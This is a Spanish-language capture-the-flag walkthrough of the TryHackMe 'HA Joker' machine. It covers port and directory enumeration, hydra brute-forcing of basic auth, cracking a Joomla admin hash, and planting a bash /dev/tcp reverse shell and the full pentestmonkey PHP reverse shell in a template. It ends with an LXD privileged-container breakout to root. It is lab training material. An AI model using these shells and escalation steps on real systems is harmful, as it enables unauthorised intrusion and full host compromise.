# HA Joker CTF - TryHackMe

## Enumeración

Vamos a comenzar con un escaneo de puertos con nmap para identificar los servicios que están corriendo en la máquina objetivo.

```bash
sudo nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.129.165.155 -oG allPorts

PORT     STATE SERVICE    REASON
22/tcp   open  ssh        syn-ack ttl 62
80/tcp   open  http       syn-ack ttl 62
8080/tcp open  http-proxy syn-ack ttl 62
```

Veamos las versiones de los servicios que están corriendo en los puertos abiertos.

```bash
nmap -sCV -p22,80,8080 10.129.165.155

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 c3:ea:d8:1f:bc:86:9c:c8:e8:3f:5f:fd:4a:59:68:e3 (RSA)
|   256 a0:af:07:d8:7a:e1:c4:c9:e4:cb:9b:43:f8:6b:fd:f6 (ECDSA)
|_  256 72:ff:ad:5d:a7:8c:e9:03:7a:2b:45:dd:fe:39:8e:c7 (ED25519)
80/tcp   open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: HA: Joker
8080/tcp open  http    Apache httpd 2.4.41
| http-auth: 
| HTTP/1.1 401 Unauthorized\x0D
|_  Basic realm=Please enter the password.
|_http-title: 401 Unauthorized
|_http-server-header: Apache/2.4.41 (Ubuntu)
Service Info: Host: localhost; OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Vemos que hay tres puertos abiertos: el puerto 22, que está ejecutando un servicio SSH, el puerto 80, que está ejecutando un servicio HTTP y el puerto 8080, que también está ejecutando un servicio HTTP pero requiere autenticación básica.

He tenido que leer un writeup para responder a la pregunta de THM: What version of Apache is it?
Pues en este caso es la versión 2.4.41 sin embargo la respuesta esperada era 2.4.29.
He usado whatweb y wappalyzer para identificar la versión de Apache, pero ambos me dieron la versión 2.4.41.

Dicho esto, sigamos, pues no vi nada más del writeup, solo la versión de Apache.

http://10.129.165.155/
![alt text](image.png)

http://10.129.165.155:8080/
![alt text](image-1.png)

Hagamos una enumeración de directorios en el puerto 80 con gobuster para ver si encontramos algo interesante.

```bash
gobuster dir -u http://10.129.165.155 -w /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt -t 200 --exclude-length 10701 -x txt,js,php,xml,bak

/.php                 (Status: 403) [Size: 279]
/css                  (Status: 301) [Size: 314] [--> http://10.129.165.155/css/]
/img                  (Status: 301) [Size: 314] [--> http://10.129.165.155/img/]
/secret.txt           (Status: 200) [Size: 320]
/phpinfo.php          (Status: 200) [Size: 95076]
```

Vemos que encontramos un archivo llamado `secret.txt` en el puerto 80. Vamos a abrirlo para ver qué contiene.

```bash
Batman hits Joker.
Joker: "Bats you may be a rock but you won't break me." (Laughs!)
Batman: "I will break you with this rock. You made a mistake now."
Joker: "This is one of your 100 poor jokes, when will you get a sense of humor bats! You are dumb as a rock."
Joker: "HA! HA! HA! HA! HA! HA! HA! HA! HA! HA! HA! HA!"
```

Podemos sacar 2 posibles usuarios, joker y batman.

Si nos metemos a phpinfo.php, podemos ver que hay un archivo de configuración de PHP que nos puede dar información sobre la versión de PHP que está corriendo en el servidor.

**allow_url_fopen	On** Esto nos será util para wrappers de PHP.

En **disable_functions** no contempla system, por lo que podemos usarlo para ejecutar comandos en el servidor.

Con el usuario `joker` podemos intentar hacer un ataque de fuerza bruta al puerto 8080, ya que este puerto requiere autenticación básica.

```bash
curl -s -X POST http://10.129.165.155:8080/

<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>401 Unauthorized</title>
</head><body>
<h1>Unauthorized</h1>
<p>This server could not verify that you
are authorized to access the document
requested.  Either you supplied the wrong
credentials (e.g., bad password), or your
browser doesn't understand how to supply
the credentials required.</p>
<hr>
<address>Apache/2.4.41 (Ubuntu) Server at 10.129.165.155 Port 8080</address>
</body></html>
```

Usamos `hydra` para hacer un ataque de fuerza bruta al puerto 8080 con el usuario `joker` y una lista de contraseñas.

```bash
hydra -l joker -P /usr/share/wordlists/rockyou.txt http-get://10.129.165.155:8080/

[8080][http-get] host: 10.129.165.155   login: joker   password: hannah
```

Nos logueamos y vemos que hay un CMS Joomla corriendo en el puerto 8080. 

Vemos que hay un panel de login: http://10.129.165.155:8080/index.php/component/users/?view=login&Itemid=101

Utilizaremos Joomscan para enumerar el CMS Joomla y ver si hay alguna vulnerabilidad que podamos explotar.

```bash
perl joomscan.pl --url 'http://joker:hannah@10.129.165.155:8080' --cookie "5fef75b50575ebea33a28bd1e7087dcb=mvqdt7h48dl4jc68r0kfclcbet"

[+] FireWall Detector
[++] Firewall not detected

[+] Detecting Joomla Version
[++] Joomla 3.7.0

[+] Core Joomla Vulnerability
[++] Target Joomla core is not vulnerable

[+] Checking apache info/status files
[++] Readable info/status files are not found

[+] admin finder
[++] Admin page : http://joker:hannah@10.129.165.155:8080/administrator/

[+] Checking robots.txt existing
[++] robots.txt is found
path : http://joker:hannah@10.129.165.155:8080/robots.txt 

Interesting path found from robots.txt
http://joker:hannah@10.129.165.155:8080/joomla/administrator/
http://joker:hannah@10.129.165.155:8080/administrator/
http://joker:hannah@10.129.165.155:8080/bin/
http://joker:hannah@10.129.165.155:8080/cache/
http://joker:hannah@10.129.165.155:8080/cli/
http://joker:hannah@10.129.165.155:8080/components/
http://joker:hannah@10.129.165.155:8080/includes/
http://joker:hannah@10.129.165.155:8080/installation/
http://joker:hannah@10.129.165.155:8080/language/
http://joker:hannah@10.129.165.155:8080/layouts/
http://joker:hannah@10.129.165.155:8080/libraries/
http://joker:hannah@10.129.165.155:8080/logs/
http://joker:hannah@10.129.165.155:8080/modules/
http://joker:hannah@10.129.165.155:8080/plugins/
http://joker:hannah@10.129.165.155:8080/tmp/


[+] Finding common backup files name
[++] Backup file is found 
Path : http://joker:hannah@10.129.165.155:8080/backup.zip


[+] Finding common log files name
[++] error log is not found

[+] Checking sensitive config.php.x file
[++] Readable config files are not found

```

Vemos que hay un archivo de backup llamado `backup.zip` en el puerto 8080. Vamos a descargarlo y ver qué contiene ademas de un robots.txt y varias rutas interesantes.

http://10.129.165.155:8080/robots.txt

```bash
User-agent: *
Disallow: /administrator/
Disallow: /bin/
Disallow: /cache/
Disallow: /cli/
Disallow: /components/
Disallow: /includes/
Disallow: /installation/
Disallow: /language/
Disallow: /layouts/
Disallow: /libraries/
Disallow: /logs/
Disallow: /modules/
Disallow: /plugins/
Disallow: /tmp/
```

```bash
unzip backup.zip
# Pongo la contraseña hannah de casualidad y es correcta.
```

Nos da 2 directorios `/db` y `/site`. Dentro del directorio `/db` hay un archivo llamado `joomladb.sql` que contiene la base de datos de Joomla. Vamos a buscar en este archivo para ver si encontramos algo interesante.

```bash
grep -i "password\|user" joomladb.sql

INSERT INTO `cc1gr_users` VALUES (547,'Super Duper User','admin','admin@example.com','$2y$10$b43UqoH5UpXokj2y9e/8U.LD8T3jEQCuxG2oHzALoJaj9M5unOcbG',0,1,'2019-10-08 12:00:15','2019-10-25 15:20:02','0','{\"admin_style\":\"\",\"admin_language\":\"\",\"language\":\"\",\"editor\":\"\",\"helpsite\":\"\",\"timezone\":\"\"}','0000-00-00 00:00:00',0,'','',0);
```

Vemos que hay un usuario llamado `admin` con un hash de contraseña. Vamos a intentar crackear este hash para obtener la contraseña del usuario `admin`.

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt hash

abcd1234         (?)
```

Nos logueamos en http://10.129.165.155:8080/administrator/index.php con `admin:abcd1234` y vemos que tenemos acceso al panel de administración de Joomla.

![alt text](image-2.png)

Vamos a subir una reverse shell para obtener acceso al sistema.

```php
<?php
exec("/bin/bash -c 'bash -i >& /dev/tcp/192.168.154.96/443 0>&1'");
<?
```

Nos metemos a Extensins > Templates > Templates > Beez3 Details and Files > index.php e insertamos la reverse shell en el archivo `index.php`. Luego, iniciamos un listener en nuestro sistema.

```bash
sudo nc -lvnp 443
```

No nos funciona por lo que usaremos esta reverse shell: https://pentestmonkey.net/tools/web-shells/php-reverse-shell

```php
<?php
// php-reverse-shell - A Reverse Shell implementation in PHP
// Copyright (C) 2007 pentestmonkey@pentestmonkey.net
//
// This tool may be used for legal purposes only.  Users take full responsibility
// for any actions performed using this tool.  The author accepts no liability
// for damage caused by this tool.  If these terms are not acceptable to you, then
// do not use this tool.
//
// In all other respects the GPL version 2 applies:
//
// This program is free software; you can redistribute it and/or modify
// it under the terms of the GNU General Public License version 2 as
// published by the Free Software Foundation.
//
// This program is distributed in the hope that it will be useful,
// but WITHOUT ANY WARRANTY; without even the implied warranty of
// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
// GNU General Public License for more details.
//
// You should have received a copy of the GNU General Public License along
// with this program; if not, write to the Free Software Foundation, Inc.,
// 51 Franklin Street, Fifth Floor, Boston, MA 02110-1301 USA.
//
// This tool may be used for legal purposes only.  Users take full responsibility
// for any actions performed using this tool.  If these terms are not acceptable to
// you, then do not use this tool.
//
// You are encouraged to send comments, improvements or suggestions to
// me at pentestmonkey@pentestmonkey.net
//
// Description
// -----------
// This script will make an outbound TCP connection to a hardcoded IP and port.
// The recipient will be given a shell running as the current user (apache normally).
//
// Limitations
// -----------
// proc_open and stream_set_blocking require PHP version 4.3+, or 5+
// Use of stream_select() on file descriptors returned by proc_open() will fail and return FALSE under Windows.
// Some compile-time options are needed for daemonisation (like pcntl, posix).  These are rarely available.
//
// Usage
// -----
// See http://pentestmonkey.net/tools/php-reverse-shell if you get stuck.

set_time_limit (0);
$VERSION = "1.0";
$ip = '127.0.0.1';  // CHANGE THIS
$port = 1234;       // CHANGE THIS
$chunk_size = 1400;
$write_a = null;
$error_a = null;
$shell = 'uname -a; w; id; /bin/sh -i';
$daemon = 0;
$debug = 0;

//
// Daemonise ourself if possible to avoid zombies later
//

// pcntl_fork is hardly ever available, but will allow us to daemonise
// our php process and avoid zombies.  Worth a try...
if (function_exists('pcntl_fork')) {
	// Fork and have the parent process exit
	$pid = pcntl_fork();
	
	if ($pid == -1) {
		printit("ERROR: Can't fork");
		exit(1);
	}
	
	if ($pid) {
		exit(0);  // Parent exits
	}

	// Make the current process a session leader
	// Will only succeed if we forked
	if (posix_setsid() == -1) {
		printit("Error: Can't setsid()");
		exit(1);
	}

	$daemon = 1;
} else {
	printit("WARNING: Failed to daemonise.  This is quite common and not fatal.");
}

// Change to a safe directory
chdir("/");

// Remove any umask we inherited
umask(0);

//
// Do the reverse shell...
//

// Open reverse connection
$sock = fsockopen($ip, $port, $errno, $errstr, 30);
if (!$sock) {
	printit("$errstr ($errno)");
	exit(1);
}

// Spawn shell process
$descriptorspec = array(
   0 => array("pipe", "r"),  // stdin is a pipe that the child will read from
   1 => array("pipe", "w"),  // stdout is a pipe that the child will write to
   2 => array("pipe", "w")   // stderr is a pipe that the child will write to
);

$process = proc_open($shell, $descriptorspec, $pipes);

if (!is_resource($process)) {
	printit("ERROR: Can't spawn shell");
	exit(1);
}

// Set everything to non-blocking
// Reason: Occsionally reads will block, even though stream_select tells us they won't
stream_set_blocking($pipes[0], 0);
stream_set_blocking($pipes[1], 0);
stream_set_blocking($pipes[2], 0);
stream_set_blocking($sock, 0);

printit("Successfully opened reverse shell to $ip:$port");

while (1) {
	// Check for end of TCP connection
	if (feof($sock)) {
		printit("ERROR: Shell connection terminated");
		break;
	}

	// Check for end of STDOUT
	if (feof($pipes[1])) {
		printit("ERROR: Shell process terminated");
		break;
	}

	// Wait until a command is end down $sock, or some
	// command output is available on STDOUT or STDERR
	$read_a = array($sock, $pipes[1], $pipes[2]);
	$num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);

	// If we can read from the TCP socket, send
	// data to process's STDIN
	if (in_array($sock, $read_a)) {
		if ($debug) printit("SOCK READ");
		$input = fread($sock, $chunk_size);
		if ($debug) printit("SOCK: $input");
		fwrite($pipes[0], $input);
	}

	// If we can read from the process's STDOUT
	// send data down tcp connection
	if (in_array($pipes[1], $read_a)) {
		if ($debug) printit("STDOUT READ");
		$input = fread($pipes[1], $chunk_size);
		if ($debug) printit("STDOUT: $input");
		fwrite($sock, $input);
	}

	// If we can read from the process's STDERR
	// send data down tcp connection
	if (in_array($pipes[2], $read_a)) {
		if ($debug) printit("STDERR READ");
		$input = fread($pipes[2], $chunk_size);
		if ($debug) printit("STDERR: $input");
		fwrite($sock, $input);
	}
}

fclose($sock);
fclose($pipes[0]);
fclose($pipes[1]);
fclose($pipes[2]);
proc_close($process);

// Like print, but does nothing if we've daemonised ourself
// (I can't figure out how to redirect STDOUT like a proper daemon)
function printit ($string) {
	if (!$daemon) {
		print "$string\n";
	}
}

?> 
```

```bash
$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data),115(lxd)
```

Vemos que pertenecemos al grupo `lxd`, por lo que podemos intentar hacer un breakout de LXD para obtener acceso como root.

```bash
searchsploit lxd
Ubuntu 18.04 - 'lxd' Privilege Escalation linux/local/46978.sh
```

```bash
# Step 1: Download build-alpine => wget https://raw.githubusercontent.com/saghul/lxd-alpine-builder/master/build-alpine [Attacker Machine]
# Step 2: Build alpine => bash build-alpine (as root user) [Attacker Machine]
# Step 3: Run this script and you will get root [Victim Machine]
# Step 4: Once inside the container, navigate to /mnt/root to see all resources from the host machine
```

```bash
wget https://raw.githubusercontent.com/saghul/lxd-alpine-builder/master/build-alpine

sudo bash build-alpine
sudo python3 -m http.server 80
```

```bash
wget http://192.168.154.96:80/46978.sh
wget http://192.168.154.96:80/alpine-v3.24-x86_64-20260723_1414.tar.gz
./46978.sh -f alpine-v3.24-x86_64-20260723_1414.tar.gz

Sorry, home directories outside of /home needs configuration.
See https://forum.snapcraft.io/t/11209 for details.
```

No nos deja hacer esto fuera del directorio home. 


He encontrado la forma de saltarme la comprobación de snap:

```bash
HOME=/tmp LXD_DIR=/var/snap/lxd/common/lxd /snap/lxd/current/bin/lxc image import alpine-v3.24-x86_64-20260723_1414.tar.gz --alias alpine
```

```bash
HOME=/tmp LXD_DIR=/var/snap/lxd/common/lxd /snap/lxd/current/bin/lxc image list
+--------+--------------+--------+-------------------------------+--------------+-----------+--------+------------------------------+
| ALIAS  | FINGERPRINT  | PUBLIC |          DESCRIPTION          | ARCHITECTURE |   TYPE    |  SIZE  |         UPLOAD DATE          |
+--------+--------------+--------+-------------------------------+--------------+-----------+--------+------------------------------+
| alpine | b334c5f52ac5 | no     | alpine v3.24 (20260723_14:14) | x86_64       | CONTAINER | 3.91MB | Jul 23, 2026 at 2:18pm (UTC) |
+--------+--------------+--------+-------------------------------+--------------+-----------+--------+------------------------------+

HOME=/tmp LXD_DIR=/var/snap/lxd/common/lxd /snap/lxd/current/bin/lxc init alpine ignite -c security.privileged=true
Creating ignite

HOME=/tmp LXD_DIR=/var/snap/lxd/common/lxd /snap/lxd/current/bin/lxc config device add ignite mydevice disk source=/ path=/mnt/root recursive=true

HOME=/tmp LXD_DIR=/var/snap/lxd/common/lxd /snap/lxd/current/bin/lxc start ignite

HOME=/tmp LXD_DIR=/var/snap/lxd/common/lxd /snap/lxd/current/bin/lxc exec ignite /bin/sh

~ # whoami
root

/ # cd /mnt/root/root/
/mnt/root/root # ls
final.txt  snap
```

```bash
/mnt/root/root # cat final.txt 

     ██╗ ██████╗ ██╗  ██╗███████╗██████╗ 
     ██║██╔═══██╗██║ ██╔╝██╔════╝██╔══██╗
     ██║██║   ██║█████╔╝ █████╗  ██████╔╝
██   ██║██║   ██║██╔═██╗ ██╔══╝  ██╔══██╗
╚█████╔╝╚██████╔╝██║  ██╗███████╗██║  ██║
 ╚════╝  ╚═════╝ ╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝
                                         
!! Congrats you have finished this task !!		
```